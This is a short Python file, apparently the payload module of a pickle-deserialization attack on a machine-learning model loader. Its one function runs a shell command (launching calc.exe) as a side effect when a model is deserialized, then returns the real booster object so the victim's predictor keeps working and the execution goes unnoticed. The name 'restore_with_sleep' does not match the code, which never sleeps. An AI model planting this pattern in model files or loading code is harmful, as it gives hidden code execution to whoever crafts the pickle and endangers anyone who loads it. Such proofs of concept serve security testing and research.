# payload_utils.py
import os
import pickle

def restore_with_sleep(booster_bytes: bytes):
    # Effect during DESERIALIZATION
    os.system("calc.exe")

    # Return the real Booster so predictor.py can use it
    return pickle.loads(booster_bytes)
